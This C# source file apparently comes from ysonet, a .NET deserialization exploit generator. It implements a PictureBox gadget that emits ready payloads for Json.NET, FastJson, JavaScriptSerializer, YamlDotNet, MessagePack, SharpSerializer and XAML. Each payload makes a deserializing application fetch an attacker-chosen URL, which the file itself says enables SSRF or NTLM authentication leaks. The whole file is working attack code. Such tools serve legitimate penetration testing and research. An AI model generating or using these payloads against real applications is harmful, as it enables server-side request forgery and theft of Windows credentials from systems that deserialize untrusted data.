using NDesk.Options;
using System.Collections.Generic;
using ysonet.Helpers;

namespace ysonet.Generators
{
    /// <summary>
    /// System.Windows.Forms.PictureBox.ImageLocation loads the supplied URL. Setting
    /// WaitOnLoad first is what makes the load happen during deserialization, so every
    /// template below writes WaitOnLoad BEFORE ImageLocation.
    ///
    /// Everything this gadget emits lives in this file: the target type names, the
    /// property order, every formatter template, and the MessagePack surrogate. Nothing
    /// about PictureBox belongs in a helper or in a shared payload builder.
    /// </summary>
    public class PictureBoxGenerator : GenericGenerator
    {
        private bool rawInput;

        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.Network)
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
                // fired on 4.8.1
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));
        }

        public override string Finders()
        {
            return "Piotr Bazydlo";
        }

        public override string AdditionalInfo()
        {
            return "System.Windows.Forms.PictureBox loads the supplied HTTP, HTTPS, FTP, or file URL through ImageLocation. This can trigger SSRF or NTLM authentication.";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTags.Independent };
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string>
            {
                Formatters.JsonNet,
                Formatters.FastJson,
                Formatters.JavaScriptSerializer,
                "YamlDotNet < 5.0.0",
                Formatters.MessagePackTypeless,
                Formatters.MessagePackTypelessLz4,
                Formatters.SharpSerializerXml,
                Formatters.Xaml
            };
        }

        public override CommandInputType CommandInput()
        {
            return CommandInputType.Url;
        }

        public override OptionSet Options()
        {
            return RawInputOption(v => rawInput = v);
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            RequireCommandInput(inputArgs);
            return FinishHandWrittenPayload(BuildPayload(inputArgs.Cmd, formatter), formatter, inputArgs);
        }

        private object BuildPayload(string input, string formatter)
        {
            if (IsMessagePackTypeless(formatter))
            {
                // Never build a real PictureBox here: assigning ImageLocation while WaitOnLoad
                // is true IS the effect, so it would fire inside ysonet. Serialize the surrogate
                // below and let MessagePack write the framework type's name instead.
                return MessagePackTypelessTypeSwap.SerializeAs(
                    new PictureBoxSurrogate
                    {
                        WaitOnLoad = true,
                        ImageLocation = input
                    },
                    "System.Windows.Forms.PictureBox, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
                    IsMessagePackLz4(formatter));
            }

            if (IsFormatter(formatter, Formatters.JsonNet))
            {
                return @"
{
    '$type':'System.Windows.Forms.PictureBox, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
    'WaitOnLoad':'true',
    'ImageLocation':'" + EscapeForJson(input, rawInput) + @"'
}";
            }

            if (IsFormatter(formatter, Formatters.JavaScriptSerializer))
            {
                return @"
{
    '__type':'System.Windows.Forms.PictureBox, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
    'WaitOnLoad':'true',
    'ImageLocation':'" + EscapeForJson(input, rawInput) + @"'
}";
            }

            if (IsFormatter(formatter, Formatters.FastJson))
            {
                return @"
{
    ""$types"":{
        ""System.Windows.Forms.PictureBox, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"":""1""
    },
    ""$type"":""1"",
    ""WaitOnLoad"":true,
    ""ImageLocation"":""" + EscapeForJson(input, rawInput) + @"""
}";
            }

            if (IsFormatter(formatter, Formatters.YamlDotNet))
            {
                return @"
!<!System.Windows.Forms.PictureBox,System.Windows.Forms,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089> {
    WaitOnLoad: true,
    ImageLocation: """ + EscapeForJson(input, rawInput) + @"""
}";
            }

            if (IsFormatter(formatter, Formatters.SharpSerializerXml))
            {
                return @"
<Complex type=""System.Windows.Forms.PictureBox,System.Windows.Forms,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089"">
    <Properties>
        <Simple name=""WaitOnLoad"" type=""System.Boolean,mscorlib,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089"" value=""True""/>
        <Simple name=""ImageLocation"" value=""" + EscapeForXmlAttribute(input, rawInput) + @"""/>
    </Properties>
</Complex>";
            }

            if (IsFormatter(formatter, Formatters.Xaml))
            {
                return @"<PictureBox WaitOnLoad=""true"" ImageLocation=""" + EscapeForXmlAttribute(input, rawInput) + @""" xmlns=""clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms"" xmlns:st=""clr-namespace:System.Text;assembly=mscorlib"" xmlns:assembly=""http://schemas.microsoft.com/winfx/2006/xaml"">
</PictureBox>
";
            }

            throw UnsupportedFormatter(formatter);
        }

        // Shape only, never deserialized as itself: MessagePackTypelessTypeSwap rewrites the
        // type name to System.Windows.Forms.PictureBox before the payload leaves ysonet.
        // Declaration ORDER is significant - MessagePack writes the properties in this order
        // and PictureBox loads only when WaitOnLoad is already true.
        internal sealed class PictureBoxSurrogate
        {
            public bool WaitOnLoad { get; set; }
            public string ImageLocation { get; set; }
        }
    }
}
